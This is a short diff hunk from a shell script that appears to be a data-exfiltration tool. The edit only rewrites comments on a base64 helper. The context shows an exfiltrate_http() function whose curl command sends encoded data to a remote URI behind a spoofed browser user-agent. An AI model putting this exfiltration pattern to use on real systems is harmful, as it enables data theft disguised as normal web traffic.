@@ -226,7 +226,10 @@ exfiltrate_http() {
     curl -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15" "$uri?data=$encoded_data"
 }
 
-# Base64 encode the payload
+# Helper function - not ideal 
+#  Edge case function for DNS exfiltration 
+# used by exfiltrate_dns() and exfiltrate_http()
+# in cases where the  enncode_output() function is invoked by --encode option
 base64_encode() {
     echo "$1" | base64
 }
